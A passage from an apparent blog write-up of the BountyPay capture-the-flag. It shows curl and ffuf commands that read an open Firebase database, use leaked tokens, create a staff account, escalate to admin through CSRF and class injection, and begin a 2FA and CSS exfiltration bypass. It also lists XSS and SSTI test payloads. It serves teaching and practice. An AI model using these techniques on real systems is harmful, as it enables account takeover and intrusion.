+          String str1 = (String)param1DataSnapshot.getValue();
+          SharedPreferences sharedPreferences = PartTwoActivity.this.getSharedPreferences("user_created", 0);
+          SharedPreferences.Editor editor = sharedPreferences.edit();
+          String str2 = post;
+          StringBuilder stringBuilder = new StringBuilder();
+          stringBuilder.append("X-");
+          stringBuilder.append(str1);
+          if (str2.equals(stringBuilder.toString())) {
+            str2 = sharedPreferences.getString("USERNAME", "");
+            String str = sharedPreferences.getString("TWITTERHANDLE", "");
+            PartTwoActivity.this.logFlagFound(str2, str);
+            editor.putString("PARTTWO", "COMPLETE").apply();
+            PartTwoActivity.this.correctHeader();
+          } else {
+            Toast.makeText((Context)PartTwoActivity.this, "Try again! :D", 0).show();
+          } 
+        }
+      });
+}
+</pre>
+
+<p>I looked through the apk resources and found the definition of that <code>Firebase</code> database on <code>res/values/strings.xml</code>.</p>
+
+<pre class="prettyprint linenums">
+&lt;string name="firebase_database_url">https://bountypay-90f64.firebaseio.com&lt;/string>
+</pre>
+
+<p>If the Firebase database is not configured properly, its data can be accessed directly without requiring any authentication, so I tried to fetch the <code>header</code> element as specified on the code and received its value (<code>Token</code>).</p> 
+
+<pre class="prettyprint">
+# curl https://bountypay-90f64.firebaseio.com/header.json
+"Token"
+</pre>
+
+<p>Then, since <code>stringBuilder.append("X-");</code> was being used on the code, I had to append a <code>X-</code> to the obtained value. So by using <code>X-Token</code> on the input field I could continue to the last stage.</p>
+
+<h3>Part three</h3>
+
+<p>As in the previous parts, here there was also a blank page to start.</p>
+
+<img class="img-fluid" style="width: 325px;" src="/static/img/bb/h1-2006-ctf-solution/part-three.png">
+
+<p>I did the same and went to <code>bounty.pay.PartTrheeActivity.class</code> to review the code and I found there were some errors in this activity.</p>
+
+<p>When retrieving the query parameters like in the other two stages, variables <code>str1</code> and <code>str2</code> were being decoded in base64, but those weren't defined before.</p>
+
+<pre class="prettyprint linenums">
+[...]
+    if (getIntent() != null && getIntent().getData() != null) {
+      Uri uri = getIntent().getData();
+      final String firstParam = uri.getQueryParameter("three");
+      final String secondParam = uri.getQueryParameter("switch");
+      final String thirdParam = uri.getQueryParameter("header");
+      byte[] arrayOfByte1 = Base64.decode(<b>str2</b>, 0);
+      byte[] arrayOfByte2 = Base64.decode(<b>str1</b>, 0);
+      final String decodedFirstParam = new String(arrayOfByte1, StandardCharsets.UTF_8);
+      final String decodedSecondParam = new String(arrayOfByte2, StandardCharsets.UTF_8);
+      this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
+[...]
+</pre>
+
+<p>This resulted in an application error when trying to launch the activity with any query parameters because this portion of the code was reached.</p>
+
+<p>I was about to edit the code and rebuild the application to make it work, but I decided to take a better look at the rest of the code to see if this was really necessary or I could simply imagine what would happen.</p>
+
+<p>I saw the following function which seemed to be fetching a host and a token from a shared preference and then performing a POST request to it.</p>
+
+<pre class="prettyprint linenums">
+public String performPostCall(String paramString) {
+    SharedPreferences sharedPreferences = getSharedPreferences("user_created", 0);
+    String str2 = sharedPreferences.getString("HOST", "");
+    String str1 = sharedPreferences.getString("TOKEN", "");
+    Log.d("HOST IS: ", str2);
+    Log.d("TOKEN IS: ", str1);
+    try {
+      URL uRL = new URL();
+      this(str2);
+      HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
+[...]
+</pre>
+
+<p>I opened a shell on the mobile phone and checked at that shared preference being referenced on the code (<code>/data/data/bounty.pay/shared_prefs/user_created.xml</code>).</p>
+
+<pre class="prettyprint">
+root@vbox86p:/data/data/bounty.pay/shared_prefs # cat user_created.xml
+&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+&lt;map>
+    &lt;string name="TWITTERHANDLE">hipotermia&lt;/string>
+    &lt;string name="USERNAME">hipotermia&lt;/string>
+    &lt;string name="PARTONE">COMPLETE&lt;/string>
+    &lt;string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1&lt;/string>
+    &lt;string name="PARTTWO">COMPLETE&lt;/string>
+    &lt;string name="HOST">http://api.bountypay.h1ctf.com&lt;/string>
+&lt;/map>
+</pre>
+
+<p>The host value was <code>api.bountypay.h1ctf.com</code> (the site I could access via the SSRF) and the token value was some kind of hash (<code>8e9998ee3137ca9ade8f372739f062c1</code>).</p>
+
+<p>Didn't found anything else interesting here and went to see <code>bounty.pay.CongratsActivity.class</code> to check if something was mentioned on the congratulations page.</p>
+
+<pre class="prettyprint linenums">
+protected void onCreate(Bundle paramBundle) {
+    super.onCreate(paramBundle);
+    setContentView(2131427356);
+    setSupportActionBar((Toolbar)findViewById(2131231012));
+    ((FloatingActionButton)findViewById(2131230845)).setOnClickListener(new View.OnClickListener() {
+          public void onClick(View param1View) {
+            if (CongratsActivity.this.click == 0)
+              Snackbar.make(param1View, "<b>Information leaked here will help with other challenges.</b>", 0).setAction("Action", null).show(); 
+          }
+        });
+  }
+</pre>
+
+<p>Just a congratulations message shown on the screen, so I decided it was time to move forward and go back to the web part with the information obtained here.</p>
+
+<h2 id="staff">Accessing Staff</h2>
+
+<p>From the last part, I had:</p>
+<ul>
+  <li>Header: <code>X-Token</code></li>
+  <li>Token: <code>8e9998ee3137ca9ade8f372739f062c1</code></li>
+  <li>Host: <code>http://api.bountypay.h1ctf.com</code></li>
+</ul>
+<p>So I went back to find an endpoint on this host where I could test this new token.</p>
+
+<p>Without providing the token:</p>
+
+<pre class="prettyprint">
+# curl "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020"
+["Missing or invalid Token"]
+</pre>
+
+<p>Providing the token:</p>
+
+<pre class="prettyprint">
+# curl -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020"
+{"description":"Transactions for 2020-01","transactions":[]}
+</pre>
+
+<p>Thanks to this information, at this point I was able to communicate with <code>api.bountypay.h1ctf.com</code> without the help of the SSRF, so I started looking for content using <code>ffuf</code>.</p>
+
+<pre class="prettyprint">
+# ffuf -c -t 50 -w ~/wordlists/common.txt -u https://api.bountypay.h1ctf.com/api/FUZZ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -mc all -fs 22,178
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://api.bountypay.h1ctf.com/api/FUZZ
+ :: Header           : X-Token: 8e9998ee3137ca9ade8f372739f062c1
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 22,178
+________________________________________________
+
+staff                   [Status: 200, Size: 104, Words: 3, Lines: 1]
+</pre>
+
+<p>I found that by accessing to <code>/staff</code> I was returned a list of employees with their respective ids.</p>
+
+<pre class="prettyprint">
+# curl https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
+[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
+</pre>
+
+<p>I started trying those ids on every single endpoint I found till that moment without success, when suddenly I decided to do a POST request to this endpoint and observed the response changed.</p> 
+
+<pre class="prettyprint">
+# curl -X POST https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
+["Missing Parameter"]
+</pre>
+
+<p>I brute forced parameter names and tried different ways to supply that parameter (query param, www-form data, JSON data) until I found that by using <code>staff_id</code> via www-form data I got a different error.</p>
+
+<pre class="prettyprint">
+# curl -X POST -d "staff_id=kkk" https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
+["Invalid Staff ID"]
+</pre>
+
+<p>I tried by providing the ids I recently extracted from the GET request without success, those users already had an account.</p>
+
+<pre class="prettyprint">
+# curl -X POST -d "staff_id=STF:84DJKEIP38" https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
+["Staff Member already has an account"]
+</pre>
+
+<p>Meanwhile on Twitter, HackerOne retweeted the following tweet.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/hackerone-retweet.png">
+
+<p>I entered that account and found it only had a couple of tweets, the last one mentioning a new employee: Sandra.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/welcome-sandra.png">
+
+<p>Checked who BountyPay HQ was following and found Sandra's account.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/following.png">
+
+<p>She only had one tweet celebrating her first day at BountyPayHQ.</p>
+
+<img class="img-fluid" style="width: 500px;" src="/static/img/bb/h1-2006-ctf-solution/sandra.png">
+
+<p>By zooming in the image her staff id could be seen under the bar code.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/sandra-card.png">
+
+<p>I tried the POST request with her staff id and bingo!</p>
+
+<pre class="prettyprint">
+# curl -X POST -d "staff_id=STF:8FJ3KFISL3" https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
+{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
+</pre>
+
+<p>Those were certainly credentials to log in into the last subdomain I was missing: <code>staff.bountypay.h1.ctf.com</code>.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/staff-login.png">
+
+<p>Logged in as Sandra and I was in.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/staff-dashboard.png">
+
+<h2 id="privesc">Privilege escalation</h2>
+
+<p>I started poking around the application to see what actions I was allowed to do.</p>
+
+<p>Under the Profile tab, I had the ability to modify my profile name and avatar.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/staff-profile.png">
+
+<p>On the other hand, in the support tickets tab there was only one welcome message.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/staff-tickets.png">
+
+<p>And nothing else interesting by viewing its details, since I wasn't allowed to reply.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/staff-ticket.png">
+
+<p>The URL for viewing this ticket was <code>/?template=ticket&ticket_id=3582</code>, so I tried to brute force <code>ticket_id</code> numbers with <code>ffuf</code>, unfortunately I only seemed to have access to this one.</p>
+
+<pre class="prettyprint">
+# ffuf -c -u "https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=FUZZ" -w nums.txt -H "Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH" -mc all -fs 17
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=FUZZ
+ :: Header           : Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 17
+________________________________________________
+
+3582                    [Status: 200, Size: 4264, Words: 1143, Lines: 102]
+</pre>
+
+<p>Since all the pages were at <code>/?template=xxx</code> I brute forced again to see what other templates were available.</p>
+
+<pre class="prettyprint">
+# ffuf -c -w ~/wordlists/common.txt -u "https://staff.bountypay.h1ctf.com/?template=FUZZ" -H "Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH" -mc all -fs 0
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://staff.bountypay.h1ctf.com/?template=FUZZ
+ :: Header           : Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 0
+________________________________________________
+
+admin                   [Status: 200, Size: 26, Words: 5, Lines: 1]
+home                    [Status: 200, Size: 6562, Words: 2182, Lines: 148]
+login                   [Status: 200, Size: 1348, Words: 337, Lines: 34]
+ticket                  [Status: 200, Size: 17, Words: 3, Lines: 1]
+</pre>
+
+<p>The only one that I hadn't visited was the admin template, unfortunately I couldn't access with my current session.</p>
+
+<pre class="prettyprint">
+# curl "https://staff.bountypay.h1ctf.com/?template=admin" -H "Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH"
+No Access to this resource
+</pre>
+
+<p>Therefore, the objective here was probably to gain access to this template in some way.</p>
+
+<p>I noticed that at the footer of every page there was a button to report the current page.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/report-button.png">
+
+<p>This link popped the following message.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/staff-report.png">
+
+<p>Which generated a GET request to <code>/admin/report?url=Lz90ZW1wbGF0ZT1ob21l</code> being the <code>url</code> parameter the current path encoded in base64 (<code>/?template=home</code>).</p> 
+
+<p>I went to the source code to see where was this behavior implemented and found it at <code>/js/website.js</code>.</p>
+
+<pre class="prettyprint linenums">
+$(".upgradeToAdmin").click(function(){let t=$('input[name="username"]').val();$.get("/admin/upgrade?username="+t,function(){alert("User Upgraded to Admin")})}),$(".tab").click(function(){return $(".tab").removeClass("active"),$(this).addClass("active"),$("div.content").addClass("hidden"),$("div.content-"+$(this).attr("data-target")).removeClass("hidden"),!1}),$(".sendReport").click(function(){$.get("/admin/report?url="+url,function(){alert("Report sent to admin team")}),$("#myModal").modal("hide")}),document.location.hash.length>0&&("#tab1"===document.location.hash&&$(".tab1").trigger("click"),"#tab2"===document.location.hash&&$(".tab2").trigger("click"),"#tab3"===document.location.hash&&$(".tab3").trigger("click"),"#tab4"===document.location.hash&&$(".tab4").trigger("click"));
+</pre>
+
+<p>Prettified the code to read it better.</p>
+
+<pre class="prettyprint linenums">
+$(".upgradeToAdmin").click(function() {
+    let t = $('input[name="username"]').val();
+    $.get("/admin/upgrade?username=" + t, function() {
+        alert("User Upgraded to Admin")
+    })
+}), $(".tab").click(function() {
+    return $(".tab").removeClass("active"), 
+    $(this).addClass("active"), 
+    $("div.content").addClass("hidden"), 
+    $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
+}), $(".sendReport").click(function() {
+    $.get("/admin/report?url=" + url, function() {
+        alert("Report sent to admin team")
+    }), $("#myModal").modal("hide")
+}), document.location.hash.length > 0 && (
+    "#tab1" === document.location.hash && $(".tab1").trigger("click"), 
+    "#tab2" === document.location.hash && $(".tab2").trigger("click"), 
+    "#tab3" === document.location.hash && $(".tab3").trigger("click"), 
+    "#tab4" === document.location.hash && $(".tab4").trigger("click")
+);
+</pre>
+
+<p>Here I saw the endpoint <code>/admin/upgrade?username=</code> which I could use to upgrade my user. But as expected, I wasn't allowed to perform this action by my own.</p>
+
+<pre class="prettyprint">
+# curl "https://staff.bountypay.h1ctf.com/admin/upgrade?username=sandra.allison" -H "Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH"
+["Only admins can perform this"]
+</pre>
+
+<p>Anyways, this endpoint seemed to be vulnerable to CSRF, so I could trick an admin to visit <code>/admin/upgrade?username=sandra.allison</code> and the easiest way to achieve this would probably be through the report url I saw before. Unfortunately, the message already said <i>"Pages in the /admin directory will be ignored for security"</i>.</p> 
+
+<p>This was the hardest part of the CTF for me, I tried a lot of things until I found the correct way to exploit this, so I'm going to detail a bit some of those things I tried.</p>
+
+<h3>Bypassing the /admin restriction</h3>
+
+<p>The easiest way to do this would be to bypass the <code>/admin</code> restriction when reporting a page so I started trying to report a lot of payloads which didn't work:</p>
+<ul>
+  <li><code>/AdMiN/upgrade?username=sandra.allison</code></li>
+  <li><code>/kk/../admin/upgrade?username=sandra.allison</code></li>
+  <li><code>//admin//upgrade?username=sandra.allison</code></li>
+  <li><code>/%61dmin%2fupgrade?username=sandra.allison</code></li>
+  <li><code>...</code></li>
+</ul>
+
+<h3>Blind XSS</h3>
+
+<p>Since I was allowed to modify my username and my avatar I tried to leave a XSS payload there if for any reason any admin would see it, but the characters I was allowed to use seemed to be pretty well filtered.</p>
+
+<ul>
+  <li><code>sand"ra</code> &#11106; <code>sandra</code></li>
+  <li><code>sand&lt;ra</code> &#11106; <code>sandra</code></li>
+</ul>
+
+<h3>Server Side Template Injection</h3>
+
+<p>All the pages were under <code>/template?=xx</code>, maybe that was a hint that I needed to exploit a SSTI vulnerability, so I tried to leave payloads (<code>&#123;&#123;7*7}}</code>, <code>${7*7}</code>, <code>...</code>) in my username, avatar and even in the url, which was being reflected in base64 at the end of the page, but none of those worked.</p>
+
+<h3>Manually edit session cookie</h3>
+
+<p>I noticed that every time I modified my username or avatar, my session cookie was changed a bit and every time I reused a value I received the same cookie, that probably meant the user information was contained in that cookie, so maybe if I could decrypt it I could manually modify it to change my user.</p>
+
+<p style="text-align:center">
+  <code>profile_name=<b>1</b>&profile_avatar=abc</code>
+  <br><span>&#11015;&#11015;&#11015;</span><br>
+  <code><b>c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjM</b><u>4c3</u><b>pvUUdzaVZwTnRESG91V1dSQVFSL0RJckJuWnp1TmRZNVR0LzcxeWN6NGp6V2pWU2lBWjQ5WlVqRm9wVlBDMi9FS1c2NlE0YzBqam</b>RPbG1PY0QyVUpDckZoeEFoRnpGdi9FVFRRSGYycFdCNTg5QWxCb0hxaSsrZE0=</code>
+  <br><span>---</span><br>
+  <code>profile_name=<b>2</b>&profile_avatar=abc</code>
+  <br><span>&#11015;&#11015;&#11015;</span><br>
+  <code><b>c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjM</b><u>vRX</u><b>pvUUdzaVZwTnRESG91V1dSQVFSL0RJckJuWnp1TmRZNVR0LzcxeWN6NGp6V2pWU2lBWjQ5WlVqRm9wVlBDMi9FS1c2NlE0YzBqam</b>NZazJhZlZETmRXYkZqbUFrWG53cWlFelBWRTZqL1UwQXFwZ1VTb1NxaHJPZE0=</code>
+</p>
+
+<p>After spending some time here trying to find patterns, I finally gave up because I thought they wouldn't be so evil to put such a hard crypto challenge here.</p>
+
+<h3>Outdated jQuery</h3>
+
+<p>While I was reviewing the source code, I noticed the application was using jQuery 1.12.4 (<code>/js/jquery.min.js</code>), a really outdated version of this library which was launched 4 years ago (May 20, 2016), something really strange knowing this CTF was built during the last few months.</p>
+
+<p><code>/*! jQuery v1.12.4 | (c) jQuery Foundation | jquery.org/license */</code></p>
+
+<p>When I face an old version of jQuery I like to use <a href="http://research.insecurelabs.org/jquery/test/" target="_blank">this application</a> which tells you every known vulnerability for each available version.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/jquery-vulns.png">
+
+<p>Since <code>$.get()</code> was being used on the source code, I thought about trying to exploit issue 2432 to force the execution my own JavaScript code, but I couldn't find a way to change the supplied url to that function.</p> 
+
+<h3>The good one</h3>
+
+<p>After spending a lot of time in rabbit holes I decided to take a closer look at the <code>/js/website.js</code> file where the upgrade action was defined.</p>
+
+<pre class="prettyprint linenums">
+$(".upgradeToAdmin").click(function() {
+    let t = $('input[name="username"]').val();
+    $.get("/admin/upgrade?username=" + t, function() {
+        alert("User Upgraded to Admin")
+    })
+}), $(".tab").click(function() {
+    return $(".tab").removeClass("active"), 
+    $(this).addClass("active"), 
+    $("div.content").addClass("hidden"), 
+    $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
+}), $(".sendReport").click(function() {
+    $.get("/admin/report?url=" + url, function() {
+        alert("Report sent to admin team")
+    }), $("#myModal").modal("hide")
+}), document.location.hash.length > 0 && (
+    "#tab1" === document.location.hash && $(".tab1").trigger("click"), 
+    "#tab2" === document.location.hash && $(".tab2").trigger("click"), 
+    "#tab3" === document.location.hash && $(".tab3").trigger("click"), 
+    "#tab4" === document.location.hash && $(".tab4").trigger("click")
+);
+</pre>
+
+<p>I figured out that by reporting a url with <code>#tab1</code>, I could force the admin to click elements with the class <code>tab1</code>, something not really useful by itself, but what if could create an element with the class <code>tab1</code> and <code>upgradeToAdmin</code>? In that case, when that element was clicked, the event handler for <code>$(".upgradeToAdmin").click</code> would also be triggered, executing the request to <code>/admin/upgrade?username=</code>.</p>
+
+<p>I found that by modifying my avatar I could reproduce this behavior, since the <code>profile_avatar</code> was being reflected in a class attribute on the ticket detail page (<code>/?template=ticket&ticket_id=3582</code>).</p>
+
+<p><code>profile_name=sandra&profile_avatar=<b>tab1 upgradeToAdmin</b></code></p>
+
+<pre class="prettyprint linenums">
+&lt;div style="width: 100px;position: absolute">
+    &lt;div style="margin:auto" class="avatar <b>tab1 upgradeToAdmin</b>">&lt;/div>
+    &lt;div class="text-center">sandra&lt;/div>
+&lt;/div>
+</pre>
+
+<p>I could now reproduce this behavior by myself by accessing to <code>/?template=ticket&ticket_id=3582#tab1</code>, then a request to <code>/admin/upgrade?username=undefined</code> was automatically sent.</p>
+
+<p>Unfortunately, since the user being upgraded was being extracted from an input field with name username (<code>$('input[name="username"]').val();</code>) and there was none on the ticket page, the upgraded user was "undefined" not sandra.allison (I tried to change my profile name to undefined but it didn't work).</p>
+
+<p>By looking through all my visited pages I found one input field with name username at <code>/?template=login</code> and I can even control its value from the query parameter <code>username</code> like <code>/?template=login&username=sandra.allison</code>.</p>
+
+<pre class="prettyprint linenums">
+&lt;div class="panel-body">
+    &lt;div style="margin-top:7px">&lt;label>Username:&lt;/label>&lt;/div>
+    <b>&lt;div>&lt;input name="username" class="form-control" value="sandra.allison">&lt;/div></b>
+    &lt;div style="margin-top:7px">&lt;label>Password:&lt;/label>&lt;/div>
+    &lt;div>&lt;input name="password" type="password" class="form-control">&lt;/div>
+&lt;/div>
+</pre>
+
+<p>But on this template my avatar with the custom classes wasn't shown, so I couldn't trigger the click function. How could I show both templates in the same page? With arrays <code>/?template[0]=template1&template[1]=template2</code>.</p>
+
+<p>This way I could have the login template (where there was an input field with my username) and the ticket template (with my avatar that triggered the upgrade function) on the same page.</p>
+
+<p><code>/?template[0]=login&username=sandra.allison&template[1]=ticket&ticket_id=3582#tab1</code></p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/two-templates.png">
+
+<p>This resulted in an automatic request to <code>/admin/upgrade?username=sandra.allison</code>, so I reported this by using the following URL:</p>
+
+<p><code>/admin/report?url=Lz90ZW1wbGF0ZVswXT1sb2dpbiZ1c2VybmFtZT1zYW5kcmEuYWxsaXNvbiZ0ZW1wbGF0ZVsxXT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiMQ==</code></p>
+
+<p>But after waiting for several minutes and trying a couple of times, for some reason it didn't work.</p>
+
+<p>I was pretty sure this was the intended way so I decided to message <a href="https://twitter.com/adamtlangley" target="_blank">@adamtlangley</a> (CTF creator) just to make sure everything was working as expected and ensure no bot had died.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/adam-msg.png">
+
+<p>Query arrays also work without a number, I just had to remove them.</p>
+
+<p><code>/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1</code></p>
+
+<p>Finally I reported this via the following URL and got my user upgraded to admin.</p>
+
+<p><code>/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=</code></p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/admin.png">
+
+<h2 id="css-exfil">CSS exfiltration</h2>
+
+<p>I already had Brian's credentials, so I picked Marten's and tried them on <code>app.bountypay.h1ctf.com</code> where I had to bypass the 2FA as I did with Brian at the beginning of the CTF.</p>
+
+<p>I was presented with the same dashboard where I could consult transactions for any month/year, so I brute forced those again with Marten's session.</p> 
+
+<pre class="prettyprint">
+# ffuf -c -t 50 -w months.txt:MONTH -w years.txt:YEAR -u "https://app.bountypay.h1ctf.com/statements?month=MONTH&year=YEAR" -H "Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9" -mc all -fs 177
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://app.bountypay.h1ctf.com/statements?month=MONTH&year=YEAR
+ :: Header           : Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 177
+________________________________________________
+
+[Status: 200, Size: 312, Words: 3, Lines: 1]
+    * YEAR: 2020
+    * MONTH: 5
+</pre>
+
+<p>Only one result which showed those bounties who needed to be paid that the initial tweet talked about.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/marten-dashboard.png">
+
+<p>When clicking the Pay button, the following message was shown warning that 2FA was required.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/2facode.png">
+
+<p>This shouldn't be a problem since I already knew how to bypass the 2FA system.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/2facode2.png">
+
+<p>I tried again replacing the <code>challenge</code> with my custom MD5 hash as I did when logging in, but by my surprise I received an error.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/invalid-code.png">
+
+<p>Looks like there was a different system behind this 2FA and another step was missing in order to finish the CTF. I started looking through all requests to see if there was something different and found that, when clicking the Send Challenge button, this strange POST request was being sent.</p>
+
+<pre class="prettyprint">
+POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
+Host: app.bountypay.h1ctf.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
+
+app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
+</pre>
+
